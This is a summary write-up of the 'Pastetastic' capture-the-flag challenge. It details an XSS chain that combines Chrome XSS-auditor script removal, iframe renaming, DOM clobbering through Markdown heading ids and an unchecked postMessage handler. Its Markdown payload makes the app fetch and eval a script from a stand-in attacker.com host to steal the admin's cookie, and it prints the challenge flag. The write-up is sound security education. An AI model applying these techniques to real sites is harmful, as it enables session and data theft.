# TL;DR

This is just a not-that-**quick summary on the important points** / tricks of the challenge for those who worked on the challenge, but got stuck at some point / missed some tricks.

Read the README.md for a more complete writeup!

* There is no (known) vulnerability in the third-party libraries ([Prism](https://prismjs.com/) and [Marked.js](https://marked.js.org))
* The admin visit any reported URL, not just the posts on Pastetastic
  * you have to modify the "DMCA" report's HTTP request after the Recaptcha check
* `CONFIG` JS variable can be removed by abusing Chrome's XSS auditor via sending `<script ...>CONFIG=...</script>` as query parameter (e.g. `?PlzRemoveThisCodeForMe=<script>...`)
  * this is possible since Chrome 74 as it switched to `filter` mode by default instead of previous `block`
    * `filter` = removes code, `block` = does not load the website at all
    * admin used Headless Chrome 77
    * more info in this Twitter thread: https://twitter.com/shhnjk/status/1121138947923406848
  * node is removed even if the `nonce` attribute does not match, don't exactly know if it is intentional or not...
* `CONFIG` variable can be reintroduced by iframeing the website and modifying the `name` of one of its internal iframes 
  * there is no `X-Frame-Options: DENY` header and no `frame-ancestors` policy in the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), so iframeing is possible
  * to modify the `name` of the `iframe` to `CONFIG`, you first have to set the `location` of the `iframe` to a same-origin location (same-origin as `top` frame)
  * `iframes` are available on `window` as properties by their name and `window` properties are visible the same way as global JS variables - read more about [in the specs](https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set)
* You cannot run scripts in the `sandbox` iframe (as its `sandbox` attribute does not include `allow-scripts` value), but Recaptcha also adds two iframes which do not have the `sandbox` attribute set, so they can run scripts
  * so redirect one of Recaptcha's iframe (not the `sandbox` one) and name it as `CONFIG`
* The [Marked library](https://github.com/markedjs/marked/blob/master/lib/marked.js) used for rendering Markdown is able to include `<img>` tag with `src` attribute and adds `id` attribute to heading tags (eg. to `#` -> `h1`)
  * `# ![someName](URL)` will be converted to `<h1 id="someName"><img src="URL" ...></h1>`
  * [here is the code](https://github.com/markedjs/marked/blob/0b7fc5e3420832efc1c8892d9792363a85d199a5/lib/marked.js#L973) which calculates the `id` value (requires `headerIds` to be set to `true`, but this is the default config)
* The website's `postMessage` handling code (`app.js:13`) does not check the `origin` and can be called by untrusted parties (us :P)
* By creating a fake DOM structure (via **DOM Clobbering**) with the help of the tricks described above, it is possible to hijack [app.js](https://github.com/koczkatamas/gctf19/blob/master/pastetastic/writeup_assets/app.js)'s code and make it to call `loadScripts` with our JS file (which will eval our code and **steal the flag** in the cookie)
  * `this.config = CONFIG.viewer[index];` (`app.js:24`)
    * `CONFIG` is our hijacked Recaptcha iframe pointing to our html file
    * our html file contains `<iframe name="viewer" src="https://pastetastic...com/view/..."></iframe>` which points to a Markdown file
      * this would not work if we used the `sandbox` iframe, as rendering Markdown requires JS, that's why we used one of Recaptcha's iframe
    * `CONFIG.viewer` is the Markdown viewer (`/view/`) page's window
    * `CONFIG.viewer[index]` (`index=0`) is the Markdown viewer page's first iframe (so the `sandbox` iframe) and this is where the rendered Markdown is
    * so `this.config` is our rendered Markdown's window
  * for loop on `this.config.dependencies` (`app.js:28`)
    * Markdown "`# dependencies`" was converted to `<h1 id="dependencies">...</h1>`
    * named elements are visible on the window (aka. on `this.config`) - again: [here is the specs](https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set)
    * so `this.config.dependencies` is our `<h1>` tag (in JS it's a `[object HTMLHeadingElement]`)
    * `this.config.dependencies.length` is `undefined` as `HTMLHeadingElement` does not have a `length` property
      * we had to put `dependencies` into Markdown, because otherwise this code would've break and stop the script from running (as if `dependencies` was `undefined` then `dependencies.length` would cause a "cannot access a property of undefined" error)
    * `i < this.config.dependencies.length` is `false` as `0 < undefined == false` in JS
    * so the for loop never runs
  * for loop on `this.config.preload` (`app.js:33`)
    * same as before for `dependencies`
  * `this.loadPlugin(evt.data.lang)` (`app.js:16`)
    * `evt.data.lang` can be anything and is fully controlled by us via `postMessage` call
  * `const spec = this.config.plugins[lang];` (`app.js:53`)
    * Markdown "`# ![plugins](https://attacker.com/expl.js)`" was converted to `<h1 id="plugins"><img src="https://attacker.com/expl.js" ...></h1>`
    * `this.config.plugins` is the `<h1>` tag
    * set `lang` to `firstElementChild`
    * `this.config.plugins[lang]` is `h1`'s `firstElementChild`, so the `<img>` tag
    * `spec.requires` (`app.js:54`) is `undefined` as `HTMLImageElement` does not have an `requires` property, so this `if` is ignored
  * `this.loadScript(spec);` (`app.js:59`)
    * so `spec` is the `<img>` tag (`HTMLImageElement`)
    * `spec.integrity` (`app.js:68`) is `undefined` as `HTMLImageElement` does not have an `integrity` property, so this `if` is ignored
    * `fetch(spec.src, params)` (`app.js:71`) fetches the `<img>` tag's `src` attribute which is our exploit's URL
      * CORS should be considered, so the JS file should be served with the following headers:
        * `Access-Control-Allow-Origin: *`
        * `Access-Control-Allow-Methods: GET`
* Flag in admin's browser was only available via HTTPS (`secure` flag in set on cookie)
  * so use HTTPS website for each step, not to run into mixed content errors

**The flag:** `CTF{694435c0074e860b24cad51f584d0d30}`